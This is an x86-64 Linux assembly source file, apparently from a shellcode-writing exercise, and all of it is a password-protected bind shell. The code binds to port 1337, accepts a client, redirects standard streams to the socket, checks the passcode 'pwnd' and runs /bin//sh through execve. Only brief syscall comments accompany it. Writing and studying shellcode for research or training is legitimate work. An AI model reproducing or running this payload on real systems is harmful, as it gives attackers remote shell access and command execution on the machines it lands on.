global _start

section .text

_start:

	; int socket(int domain, int type, int protocol)
	; rax=41, rdi=2, rsi=1, rdx=0
	xor esi,esi
	mul esi                
	inc esi
	push 2 
	pop rdi
	add al, 41
	syscall

	; save socket fd in rdi
	xchg   rdi,rax

	; setup sockaddr strcture (af_inet=2, port=1337, inaddr_any, 0)
        push 2
        mov word [rsp + 2], 0x3905
        push rsp      
        pop rsi

	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; rax=49, rdi=fd, rsi=rsp, rdx=16
	push 0x31
	pop rax
	push rsp
	pop rsi
	push 0x10
	pop rdx
	syscall

	; int listen(int sockfd, int backlog)
	; rax=50, rdi=fd, rsi=who cares
	pop rsi
	push 0x32
	pop rax
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; rax=43, rdi=fd, rsi=rsp, rdx=16
	sub rsp, 0x10
	push rsp
	pop rsi
	push 0x2b
	pop rax
	push 0x10
	push rsp
	pop rdx
	syscall

	; store newly spawnd fd in r9
	xchg r9,rax

	; close parent socket
	xor rax, rax
	push 0x30
	pop rax
	syscall

	; dup2 (new, old)
	; rax=33, rdi=new fd, rsi=0,1,2 (stdin, stdout, stderr)
	xchg   rdi,r9
	push 0x3
	pop rsi
_loop:
	push 0x21
	pop rax
	dec esi
	syscall
	loopnz _loop

	; read (int fd, void *bf, size_t count)
	; rax=0, rdi=0 (stdin), rsi=rsp, rdx=4 (pwnd)
	xor rax, rax
	push rax
	pop rdi
	push rax
	push rsp
	pop rsi
	push 0x4
	pop rdx
	syscall

	; check passcode (pwnd)
	push 0x646e7770
	pop rbx
	cmp dword [rsi], ebx
	jne _nop

	; int execve(cont char *filename, char *const argv[], char *const envp[])
	; rax=59, rdi=*/bin//sh, rsi=0, rdx=0
	xor rax, rax
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	push rax
	push rsp
	pop rsi
	cdq
	push 0x3b
	pop rax
	syscall
	
_nop:
	nop
